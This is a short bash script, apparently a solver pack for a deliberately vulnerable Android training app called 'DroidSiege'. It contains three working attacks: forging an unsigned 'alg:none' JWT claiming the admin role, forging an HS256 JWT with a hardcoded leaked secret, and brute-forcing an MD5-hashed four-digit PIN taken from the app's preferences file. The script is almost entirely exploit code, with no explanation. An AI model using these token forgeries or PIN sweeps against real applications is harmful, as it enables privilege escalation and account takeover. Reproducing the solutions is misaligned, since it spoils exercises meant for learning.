#!/usr/bin/env bash
# DroidSiege — auth family tooling pack
set -euo pipefail

echo "== session L2: alg:none forge =="
python3 - <<'PY'
import base64, json
def b64(obj):
    raw = json.dumps(obj, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(raw).rstrip(b"=")
print("token:", b64({"alg": "none", "typ": "JWT"}).decode() + "." + b64({"role": "admin"}).decode() + ".")
PY

echo
echo "== session L3: HMAC forge with the shipped key =="
python3 - <<'PY'
import base64, hashlib, hmac, json
def b64(obj):
    raw = json.dumps(obj, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(raw).rstrip(b"=")
key = b"siege-jwt-secret-2026"
si = b64({"alg": "HS256", "typ": "JWT"}) + b"." + b64({"role": "admin"})
sig = base64.urlsafe_b64encode(hmac.new(key, si, hashlib.sha256).digest()).rstrip(b"=")
print("token:", si.decode() + "." + sig.decode())
PY

echo
echo "== pinlock L1/L2: sweep the 4-digit space =="
python3 - <<'PY'
import hashlib
target = input("pin_hash (md5, from siege_pin_prefs.xml): ").strip()
for n in range(10000):
    pin = f"{n:04d}"
    if hashlib.md5(pin.encode()).hexdigest() == target:
        print("PIN found:", pin)
        break
else:
    print("no match")
PY
